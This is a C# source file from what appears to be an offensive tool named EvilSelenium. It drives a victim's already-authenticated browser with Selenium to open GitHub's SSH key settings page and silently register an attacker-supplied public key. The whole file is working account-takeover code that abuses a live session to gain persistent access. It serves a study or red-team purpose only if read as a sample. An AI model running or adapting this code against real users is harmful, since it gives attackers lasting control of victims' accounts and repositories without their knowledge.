using System;
using OpenQA.Selenium;
using System.Threading;
using System.IO;

namespace EvilSelenium.Misc
{
    class Github
    {
        public static void AddSshKey(string pathToKey)
        {
            if (!File.Exists(pathToKey))
            {
                Console.WriteLine("[-] File doesn't exist");
                System.Environment.Exit(-1);
            }

            const string GITHUB = "https://github.com/settings/ssh/new";
            const string AUTHELEMENT = "command-palette-pjax-meta-data"; // This element ID is found for authenticated users only

            if (Helpers.IsUserAuth(GITHUB, AUTHELEMENT))
            {
                Console.WriteLine("[+] User is authenticated to GitHub");
                IWebDriver driver = Helpers.InitDriver();
                driver.Navigate().GoToUrl(GITHUB);
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

                // Insert key title
                driver.FindElement(By.Id("public_key_title")).SendKeys("Test key");

                string text = File.ReadAllText(pathToKey);

                // Insert key
                driver.FindElement(By.Id("public_key_key")).SendKeys(text);

                // Press submit button
                driver.FindElements(By.CssSelector("button[type=\"submit\"]"))[1].Click();
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

                driver.Quit();

            }
            else
            {
                Console.WriteLine("[-] User is not authenticated");
                System.Environment.Exit(-1);
            }
        }
    }
}
